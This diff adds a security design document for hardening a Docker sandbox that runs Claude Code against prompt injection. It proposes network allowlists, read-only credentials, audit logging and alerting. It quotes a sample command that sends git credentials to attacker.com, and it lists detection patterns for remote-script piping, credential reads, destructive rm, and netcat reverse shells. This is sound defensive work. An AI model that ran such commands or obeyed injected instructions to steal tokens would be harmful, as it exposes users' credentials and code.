@@ -1,0 +1,626 @@
+SECURITY ANALYSIS: Hardened Docker Container for Claude Code
+================================================================
+
+Current Repository: docker-sandbox
+Analysis Date: 2025-11-22
+Context: Hardening sandbox2 implementation from RLQuest/agents/sandbox2
+
+================================================================================
+CURRENT VULNERABILITY ANALYSIS
+================================================================================
+
+sandbox2 is vulnerable to prompt injection attacks because:
+
+1. NETWORK EXFILTRATION RISK
+   - Claude could be prompted to execute:
+     curl https://attacker.com -d "$(cat ~/.git-credentials)"
+   - Result: Git tokens stolen
+   - Claude API credentials also exposed
+
+2. REPOSITORY POISONING
+   - Could push malicious code to sandbox repository
+   - Has full write access via git token
+   - No approval required for git push
+
+3. CREDENTIAL EXPOSURE
+   - Git tokens stored in ~/.git-credentials with full network access
+   - Claude API keys in ~/.claude/ directory
+   - SSH keys if mounted
+
+4. NO AUDIT TRAIL
+   - No logging of commands Claude executes
+   - Can't review what happened after an incident
+   - No detection of suspicious activities
+
+5. NO RESOURCE PROTECTION
+   - Could crypto-mine on GPU
+   - Could fill disk with junk data
+   - Could spawn fork bomb
+   - Could exhaust memory/CPU
+
+================================================================================
+PROPOSED SECURITY DESIGN (WITHOUT BREAKING DEVELOPMENT)
+================================================================================
+
+CORE PHILOSOPHY:
+- Defense in Depth: Multiple security layers
+- Least Privilege: Minimum permissions needed for development
+- Auditability: Log everything suspicious
+- Fail-Safe: Restrictions that don't break legitimate workflows
+
+================================================================================
+SECURITY LAYER 1: NETWORK RESTRICTIONS
+================================================================================
+
+Problem: Claude has unrestricted internet access
+
+Solution Options:
+
+1. HOST-LEVEL FIREWALL (Recommended for dev)
+   - Use iptables or nftables on the host
+   - Allow only specific IPs/domains:
+     * github.com (for git operations)
+     * api.anthropic.com (for Claude API)
+     * pypi.org, files.pythonhosted.org (for pip)
+     * registry.npmjs.org (for npm)
+   - Block everything else
+   - Benefits:
+     * Claude can still work normally
+     * Can't exfiltrate to random servers
+     * Easy to add domains as needed
+
+2. DOCKER NETWORK WITH PROXY (More complex)
+   - Run filtering HTTP proxy in another container
+   - Force all container traffic through proxy
+   - Proxy implements whitelist
+   - Benefits:
+     * Fine-grained control
+     * Can log all requests
+   - Drawbacks:
+     * More complex setup
+     * Additional container to manage
+
+3. DNS-BASED FILTERING (Simplest)
+   - Custom DNS server that only resolves allowed domains
+   - docker run --dns=<custom_dns_ip>
+   - Benefits:
+     * Lightweight
+     * Easy to implement
+     * No proxy overhead
+   - Drawbacks:
+     * Can be bypassed with IP addresses
+     * Less visibility into actual requests
+
+RECOMMENDATION: DNS-based filtering for simplicity, or host firewall for
+stronger control. Start with DNS, upgrade to firewall if needed.
+
+================================================================================
+SECURITY LAYER 2: CREDENTIAL ISOLATION
+================================================================================
+
+Problem: Git tokens and Claude credentials are in container with full access
+
+Solutions:
+
+1. READ-ONLY TOKEN SCOPE
+   - Use GitHub token with read-only access for fetching
+   - Separate write token that requires manual intervention
+   - Benefits:
+     * Claude can read code
+     * Can't push without approval
+   - Implementation:
+     * Use two tokens: GIT_KEY_SANDBOX_READ, GIT_KEY_SANDBOX_WRITE
+     * Default to read-only
+     * Require manual token swap for push
+
+2. SHORT-LIVED TOKENS
+   - Regenerate git tokens every 24 hours
+   - Limit blast radius if credentials leak
+   - Benefits:
+     * Time-limited exposure
+     * Stolen tokens expire quickly
+   - Drawbacks:
+     * Requires automation
+     * Token rotation complexity
+
+3. CREDENTIAL VAULT MOUNT
+   - Mount credentials as read-only
+   - Prevents Claude from modifying/stealing credential files
+   - Example:
+     --mount type=bind,source=~/.git-credentials,\
+     target=/home/claude/.git-credentials,readonly
+   - Benefits:
+     * Can use credentials
+     * Can't modify or exfiltrate easily
+   - Limitation:
+     * Process can still read and print contents
+
+4. GIT CREDENTIAL HELPER
+   - Use credential helper that prompts outside container
+   - For write operations, require human approval
+   - Read operations auto-approved
+   - Benefits:
+     * Interactive approval for sensitive operations
+     * Maintains audit trail
+   - Drawbacks:
+     * Interrupts workflow
+     * Complex to implement
+
+RECOMMENDATION: Read-only git token + credential file mounted read-only.
+Simplest approach that provides good protection.
+
+================================================================================
+SECURITY LAYER 3: RESOURCE LIMITS
+================================================================================
+
+Problem: No limits on CPU/memory/disk usage
+
+Docker Runtime Constraints:
+
+--memory="32g"           # Generous for ML, prevents exhaustion
+--memory-swap="32g"      # No swap to prevent disk thrashing
+--cpus="4"               # 4 cores - enough for development
+--pids-limit=512         # Prevent fork bombs
+--storage-opt size=100G  # Disk quota
+
+Benefits:
+- Still full GPU access for ML workloads
+- Still plenty of resources for development
+- Prevents accidental resource exhaustion
+- Prevents crypto-mining attacks from being profitable
+- Prevents denial-of-service via resource exhaustion
+
+Adjustable Based on Hardware:
+- Adjust memory/CPU based on available resources
+- Keep generous limits for development workflow
+- Primary goal: prevent exhaustion, not restrict normal use
+
+================================================================================
+SECURITY LAYER 4: AUDIT LOGGING
+================================================================================
+
+Problem: No visibility into what Claude executes
+
+Design:
+
+1. BASH HISTORY LOGGING
+   - Override PROMPT_COMMAND in entrypoint
+   - Log every command to mounted volume
+   - Format: [timestamp] [user] [pwd] command
+   - Implementation in entrypoint.sh:
+     export PROMPT_COMMAND='echo "$(date +%Y-%m-%d_%H:%M:%S) $USER $(pwd) $(history 1)" >> /var/log/security/bash_history.log'
+   - Benefits:
+     * Complete audit trail
+     * Can review what Claude did
+     * Detect patterns over time
+
+2. GIT OPERATION LOGGING
+   - Wrap git commands with logging wrapper
+   - Log: commits, pushes, branch changes, force operations
+   - Create alias in entrypoint.sh:
+     alias git='git_with_logging'
+   - Log format:
+     [timestamp] git <command> <args> -> <result>
+   - Alert on suspicious patterns:
+     * Force push
+     * Push to non-sandbox repo
+     * Branch deletion
+     * Large commits (potential data exfiltration)
+
+3. FILE ACCESS MONITORING
+   - Log access to sensitive files
+   - Monitor:
+     * ~/.git-credentials
+     * ~/.claude/.credentials.json
+     * ~/.ssh/
+     * .env files
+   - Alert if Claude reads credential files
+   - Can detect exfiltration attempts
+   - Implementation: Use inotify or auditd if available
+
+4. NETWORK CONNECTION LOGGING
+   - Log DNS queries (what domains Claude tries to reach)
+   - Log outbound connections
+   - Detect exfiltration attempts
+   - Format:
+     [timestamp] DNS query: <domain> -> <result>
+     [timestamp] Connection: <ip>:<port> -> <allowed/blocked>
+
+Implementation Strategy:
+- Mount /var/log/security from container to host
+- All logs persist on host
+- Can review/analyze after session
+- Can set up real-time monitoring if needed
+
+================================================================================
+SECURITY LAYER 5: CAPABILITY RESTRICTIONS
+================================================================================
+
+Problem: Container has unnecessary Linux capabilities
+
+Minimal Capabilities for GPU Development:
+
+--cap-drop=ALL          # Drop everything first
+--cap-add=SETUID        # For su/sudo (user switching)
+--cap-add=SETGID        # For group switching
+--cap-add=SYS_ADMIN     # May be needed for some GPU operations
+--cap-add=DAC_OVERRIDE  # File permission overrides (for workspace)
+
+Benefits:
+- Can't perform kernel operations
+- Can't modify network settings
+- Can't load kernel modules
+- Can't mount filesystems
+- GPU still works (CUDA doesn't need most capabilities)
+
+Testing Required:
+- Verify GPU operations work with minimal capabilities
+- May need to add capabilities based on actual GPU driver requirements
+- Start minimal, add only what's needed
+
+Capabilities NOT Needed:
+- NET_ADMIN (network configuration)
+- SYS_MODULE (load kernel modules)
+- SYS_RAWIO (raw device access)
+- SYS_PTRACE (process tracing)
+- NET_RAW (raw sockets)
+
+================================================================================
+SECURITY LAYER 6: FILESYSTEM CONTROLS
+================================================================================
+
+Problem: Can modify system files and install backdoors
+
+Design:
+
+1. READ-ONLY SYSTEM DIRECTORIES
+   - /usr, /lib, /lib64, /bin, /sbin - read-only
+   - /etc - read-only (except specific files)
+   - Benefits:
+     * Can't modify system binaries
+     * Can't install system-wide backdoors
+   - Implementation:
+     * Mount as read-only in Dockerfile or with --read-only flag
+     * Use tmpfs for writable areas
+
+2. WRITABLE AREAS
+   - /workspace/<repo> - full read/write (for development)
+   - /home/claude - read/write (for user files)
+   - /tmp - tmpfs, noexec (prevents running executables)
+   - Benefits:
+     * Development workflow unaffected
+     * Can write code, run experiments
+     * Can't persist malware in system directories
+
+3. TMPFS WITH NOEXEC
+   - --tmpfs /tmp:rw,noexec,nosuid,size=2g
+   - --tmpfs /var/tmp:rw,noexec,nosuid,size=1g
+   - Benefits:
+     * Can write temporary files
+     * Can't execute downloaded malware
+     * Prevents common attack patterns
+   - Size limits prevent disk exhaustion via tmp
+
+CHALLENGE: Package Installation
+- pip install and npm install need to write files
+- Solution: Use virtual environments
+
+Package Manager Solutions:
+- Python: Use venv (already in sandbox2)
+  * Installs to /workspace/<repo>/.venv
+  * No system directory writes needed
+  * Isolated per project
+
+- Node.js: Use local node_modules (default)
+  * Installs to /workspace/<repo>/node_modules
+  * No system directory writes needed
+  * Per-project dependencies
+
+Both work without system directory writes, so read-only system dirs feasible.
+
+================================================================================
+SECURITY LAYER 7: SECURITY OPTIONS
+================================================================================
+
+Security Options:
+
+--security-opt=no-new-privileges:true
+  - Prevents privilege escalation
+  - Even if Claude finds setuid binary, can't gain privileges
+  - No impact on normal operations
+
+--security-opt=seccomp=unconfined
+  - GPU/CUDA needs many syscalls
+  - Default seccomp profile may block GPU operations
+  - Could create custom profile if needed (advanced)
+
+--security-opt=apparmor=unconfined
+  - Similar to seccomp
+  - GPU drivers may need specific access
+  - Could create custom AppArmor profile (advanced)
+
+Recommendation:
+- Start with no-new-privileges (safe, effective)
+- Use unconfined for seccomp/apparmor initially
+- Create custom profiles later if needed
+
+PID Namespace:
+- Default Docker isolation sufficient
+- Container processes isolated from host
+- Can't see or interact with host processes
+
+================================================================================
+SECURITY LAYER 8: MONITORING & ALERTS
+================================================================================
+
+Real-time Detection:
+
+1. SUSPICIOUS COMMAND PATTERNS
+   Detect and alert on:
+   - curl | bash              # Executing remote scripts
+   - wget | sh                # Executing remote scripts
+   - cat ~/.git-credentials   # Credential access
+   - cat ~/.claude/           # Credential access
+   - rm -rf / or /workspace   # Destructive commands
+   - nc, netcat               # Reverse shells
+   - base64, xxd              # Encoding (common in exfiltration)
+   - python -m http.server    # Opening ports
+   - nohup, disown            # Background processes
+
+2. GIT ANOMALIES
+   Detect and alert on:
+   - Push to non-sandbox repository
+   - Force push (git push -f)
+   - Branch deletion
+   - Large commits (>50MB) - potential data exfiltration
+   - Commits to main/master without PR
+   - Git config changes (email, remote URLs)
+
+3. NETWORK ANOMALIES
+   Detect and alert on:
+   - Connections to non-whitelisted IPs
+   - Large data transfers (>100MB)
+   - Unusual DNS queries (IP addresses, suspicious domains)
+   - Port scanning attempts
+   - Repeated connection failures (could indicate attack)
+
+4. FILE ACCESS ANOMALIES
+   Detect and alert on:
+   - Reading credential files
+   - Modifying .bashrc, .profile (persistence)
+   - Creating .ssh directories or keys
+   - Writing to unusual locations
+   - Creating executable files in temp directories
+
+Implementation:
+- Background monitoring script in container
+- Runs alongside Claude Code
+- Writes alerts to /var/log/security/alerts.log
+- Can send notifications (optional)
+- Low overhead, non-intrusive
+
+Alert Levels:
+- INFO: Normal operations logged
+- WARN: Suspicious but possibly legitimate
+- ALERT: Likely malicious, needs review
+- CRITICAL: Definitely malicious, stop container
+
+================================================================================
+PROPOSED FILE STRUCTURE
+================================================================================
+
+docker-sandbox/
+├── Dockerfile                    # Hardened container image
+├── entrypoint.sh                 # Security setup + audit logging
+├── security/
+│   ├── monitor.sh               # Real-time monitoring script
+│   ├── allowed-domains.txt      # DNS whitelist
+│   └── seccomp-profile.json     # Optional: syscall filtering
+├── logs/                        # Mounted volume for audit logs
+│   ├── bash_history.log         # All commands executed
+│   ├── git_operations.log       # Git command logs
+│   ├── security_events.log      # File access, network events
+│   └── alerts.log               # Suspicious activity alerts
+└── README.md                    # Security documentation
+
+Container Runtime:
+- Simple: docker run with security flags
+- No tmux required
+- No complex launch scripts
+- Just: docker run [security-flags] claude-sandbox
+
+Logs persist on host in ./logs/ directory for review.
+
+================================================================================
+KEY DESIGN QUESTIONS
+================================================================================
+
+1. NETWORK RESTRICTIONS
+   Question: DNS-based filtering (easiest) or host firewall rules (strongest)?
+   Question: What specific domains does Claude need access to?
+
+   Suggested Whitelist:
+   - github.com, api.github.com, *.githubusercontent.com
+   - api.anthropic.com, *.anthropic.com
+   - pypi.org, files.pythonhosted.org
+   - registry.npmjs.org, *.npmjs.org
+   - nvidia.com, *.nvidia.com (for GPU drivers/CUDA)
+   - Add more as needed for specific packages
+
+2. GIT OPERATIONS
+   Question: Should Claude be able to push to sandbox repo automatically?
+   Question: Or require manual approval for git push operations?
+
+   Options:
+   A. Auto-push allowed (current behavior, convenient but risky)
+   B. Read-only token, manual push (safest, less convenient)
+   C. Auto-push with logging and review (middle ground)
+
+3. MONITORING
+   Question: Real-time alerts (notifications), or just logging for later review?
+   Question: What actions should trigger an alert?
+
+   Suggestions:
+   - Start with logging only
+   - Add alerts for critical events (credential access, suspicious commands)
+   - Optional: Email/Slack notifications for critical alerts
+
+4. RESOURCE LIMITS
+   Question: What's reasonable for your hardware?
+
+   Suggested Starting Point:
+   - Memory: 32GB (adjust based on available RAM)
+   - CPUs: 4 cores (adjust based on available cores)
+   - Disk: 100GB (adjust based on project needs)
+   - PIDs: 512 processes
+
+   Adjust based on actual usage patterns.
+
+5. TRADEOFFS
+   Question: More security = more complexity. What level are you comfortable with?
+   Question: Should we start with "essential hardening" and iterate?
+
+   Philosophy:
+   - Start simple, add complexity as needed
+   - Measure impact on workflow
+   - Iterate based on real threats observed
+
+================================================================================
+MINIMAL VIABLE SECURITY (MVP APPROACH)
+================================================================================
+
+PHASE 1 - ESSENTIAL SECURITY (Implement First)
+- Resource limits (memory, CPU, disk, PIDs)
+- Credential files mounted read-only
+- Audit logging (bash history, git operations)
+- no-new-privileges flag
+- Capability restrictions (drop all, add minimal)
+- tmpfs with noexec
+
+Impact: Low (minor setup, no workflow changes)
+Protection: Medium (prevents most accidental issues)
+Complexity: Low (straightforward Docker flags)
+
+PHASE 2 - NETWORK CONTROLS (Add Next)
+- DNS-based domain filtering
+- Connection logging
+- Network anomaly detection
+
+Impact: Low to Medium (may need to whitelist domains)
+Protection: High (prevents exfiltration)
+Complexity: Medium (requires DNS setup or firewall rules)
+
+PHASE 3 - ADVANCED MONITORING (Optional Enhancement)
+- Real-time anomaly detection
+- Alerting system
+- Pattern matching for suspicious commands
+- Automated response (pause container on critical alert)
+
+Impact: Low (background monitoring)
+Protection: High (early detection of attacks)
+Complexity: High (requires monitoring scripts and tuning)
+
+================================================================================
+IMPLEMENTATION RECOMMENDATIONS
+================================================================================
+
+START HERE (Phase 1 - Essential Security):
+
+1. Create simple Dockerfile with hardened base
+2. Create entrypoint.sh that:
+   - Creates non-root user
+   - Sets up audit logging
+   - Configures secure environment
+   - Starts Claude Code
+
+3. Run with security flags:
+   docker run -it \
+     --name claude-sandbox \
+     --gpus all \
+     --memory="32g" \
+     --cpus="4" \
+     --pids-limit=512 \
+     --cap-drop=ALL \
+     --cap-add=SETUID \
+     --cap-add=SETGID \
+     --cap-add=SYS_ADMIN \
+     --security-opt=no-new-privileges:true \
+     --tmpfs /tmp:rw,noexec,nosuid,size=2g \
+     -v $(pwd)/logs:/var/log/security:rw \
+     -v $(pwd)/.git-credentials:/home/claude/.git-credentials:ro \
+     -e GIT_TOKEN=$GIT_KEY_SANDBOX \
+     claude-sandbox
+
+4. Test with normal development workflow
+5. Review logs after sessions
+6. Iterate based on findings
+
+THEN ADD (Phase 2 - Network Controls):
+- Implement DNS filtering or firewall rules
+- Test with real development tasks
+- Whitelist additional domains as needed
+
+LATER (Phase 3 - Advanced Monitoring):
+- Add monitoring scripts if threats observed
+- Implement alerting if needed
+- Fine-tune detection rules
+
+================================================================================
+SECURITY vs USABILITY MATRIX
+================================================================================
+
+Security Level:  LOW -------- MEDIUM -------- HIGH -------- MAXIMUM
+                  |             |              |              |
+Usability:       HIGH         HIGH          MEDIUM          LOW
+                  |             |              |              |
+Current (sandbox2)            Phase 1       Phase 2       Phase 3
+                              (MVP)      (Recommended)  (Advanced)
+
+Recommended Target: Phase 2 (High security, High usability)
+
+This provides strong protection against prompt injection while maintaining
+a smooth development workflow. Phase 3 is optional for highly sensitive work.
+
+================================================================================
+CONCLUSION
+================================================================================
+
+The current sandbox2 implementation prioritizes convenience over security and
+is vulnerable to prompt injection attacks that could:
+- Steal credentials
+- Poison repositories
+- Exfiltrate data
+- Mine cryptocurrency
+- Install backdoors
+
+The proposed hardened design provides defense-in-depth security through:
+- Network restrictions (prevents exfiltration)
+- Credential isolation (limits token exposure)
+- Resource limits (prevents abuse)
+- Audit logging (enables detection and response)
+- Capability restrictions (reduces attack surface)
+- Filesystem controls (prevents persistence)
+- Monitoring (detects attacks in progress)
+
+Implementation can be phased:
+- Phase 1: Essential hardening (low effort, medium protection)
+- Phase 2: Network controls (medium effort, high protection) ← Recommended
+- Phase 3: Advanced monitoring (high effort, maximum protection)
+
+All phases maintain full development capabilities:
+- GPU access preserved
+- Generous resource limits
+- Normal git operations
+- Package installation works
+- No workflow interruptions
+
+Next Steps:
+1. Review design and answer key questions
+2. Implement Phase 1 (essential hardening)
+3. Test with real development workflow
+4. Add Phase 2 (network controls) based on needs
+5. Monitor and iterate
+
+================================================================================
+END OF ANALYSIS
+================================================================================
